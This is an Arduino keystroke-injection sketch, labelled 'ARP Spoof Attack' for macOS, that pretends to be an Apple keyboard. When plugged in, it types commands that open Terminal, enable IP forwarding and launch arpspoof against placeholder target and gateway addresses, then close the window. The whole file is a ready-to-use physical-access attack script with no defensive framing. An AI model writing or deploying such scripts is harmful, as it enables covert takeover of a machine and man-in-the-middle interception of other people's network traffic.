#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // ARP poisoning (requires arpspoof from dsniff)
  // Author: Generated
  // Title: ARP Spoof Attack
  // Target: macOS
  // Version: 1.0
  // Category: Network-Attacks
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("sudo sysctl -w net.inet.ip.forwarding=1");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("sudo arpspoof -i en0 -t TARGET_IP GATEWAY_IP &");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo 'ARP spoofing started'");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}